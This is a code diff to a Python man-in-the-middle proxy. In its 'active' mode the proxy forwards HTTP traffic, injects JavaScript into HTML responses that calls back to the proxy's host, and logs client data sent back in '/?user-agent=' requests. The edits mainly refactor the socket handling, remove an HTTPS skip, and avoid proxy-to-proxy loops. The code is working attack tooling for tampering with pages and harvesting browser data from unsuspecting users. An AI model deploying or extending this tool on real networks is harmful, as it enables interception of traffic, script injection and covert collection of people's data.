@@ -88,7 +88,10 @@ def proxy_passive(listening_ip, listening_port):
     
     # For each incoming connection, create a new thread and handle the request
     while True:
-        client_socket, _ = proxy_socket.accept()
+        client_socket, client_address = proxy_socket.accept()
+        if client_address[0] == listening_ip:
+            print("Skipping connection from proxy to proxy...")
+            continue
         client_handler = threading.Thread(target=handle_passive_client, args=(client_socket,))
         client_handler.start()
 
@@ -262,52 +265,55 @@ def proxy_active(listening_ip, listening_port):
 
 
 def handle_active_client(client_socket, proxy_ip, proxy_port):
-    with client_socket:
-        request = client_socket.recv(4096)
-        request_data = request.decode('utf-8')
-        host, port = get_destination_host_port(request_data)
+   
+    request = client_socket.recv(4096)
+    request_data = request.decode('utf-8')
+    host, port = get_destination_host_port(request_data)
 
-        if port == 443:
-            print("Skipping HTTPS request to host: {}, port: {}".format(host, port))
-            return
+    print("Handling HTTP request to host: {}, port: {}".format(host, port))
 
-        print("Handling HTTP request to host: {}, port: {}".format(host, port))
+    # Handle the GET request with client data
+    if '/?user-agent=' in request_data:
+        parse_and_log_client_data(request_data)
+        # Send a simple HTTP response (acknowledgment)
+        client_socket.sendall("HTTP/1.1 200 OK\r\n\r\n".encode('utf-8'))
+        client_socket.close()
+        return
 
-        # Handle the GET request with client data
-        if '/?user-agent=' in request_data:
-            parse_and_log_client_data(request_data)
-            # Send a simple HTTP response (acknowledgment)
-            client_socket.sendall("HTTP/1.1 200 OK\r\n\r\n".encode('utf-8'))
-            return
+    # Forwarding the request to the destination server
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.connect((host, port))
+    server_socket.send(request)
 
-        # Forwarding the request to the destination server
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.connect((host, port))
-        server_socket.sendall(request)
+    response = server_socket.recv(8192)
+
+    """
+    response = b''
+    while True:
+        data = server_socket.recv(4096)
+        if not data:
+            break
+    response += data
+    """
+    
+    try:
+        print("Handling HTTP response from host: {}, port: {}".format(host, port))
+        response_data = response.decode('utf-8')
+        if DEBUG:
+            print("Response is:\n " + response_data)
+        # Inject JavaScript if content is HTML
+        if 'text/html' in response_data:
+            response_data = inject_javascript(response_data, proxy_ip, proxy_port)
+    except Exception as e:
+        print("Error decoding response: {}".format(e))
+        # Forward the original response in case of decode error
+        client_socket.send(response)
+        client_socket.close()
+        return
         
-
-        response = b''
-        while True:
-            data = server_socket.recv(4096)
-            if not data:
-                break
-        response += data
-        
-        try:
-            print("Handling HTTP response from host: {}, port: {}".format(host, port))
-            response_data = response.decode('utf-8')
-            if DEBUG:
-                print("Response is:\n " + response_data)
-            # Inject JavaScript if content is HTML
-            if 'text/html' in response_data:
-                response_data = inject_javascript(response_data, proxy_ip, proxy_port)
-        except Exception as e:
-            print("Error decoding response: {}".format(e))
-            # Forward the original response in case of decode error
-            client_socket.sendall(response)
-            return
-        
-        client_socket.sendall(response_data.encode('utf-8'))
+    client_socket.send(response_data.encode('utf-8'))
+    client_socket.close()
+    server_socket.close()
 
 def modify_content_length_header(response_data, len_js_code):
     if DEBUG:
@@ -339,13 +345,7 @@ def modify_content_length_header(response_data, len_js_code):
 
     return modified_response
 
-    '''
-    # Reassemble the modified response
-    modified_response = "\n".join(headers) + "\n\n" + body
 
-    if DEBUG:
-        print("Modified response:\n{}".format(modified_response))
-    '''
 
 def parse_and_log_client_data(request_data):
     """
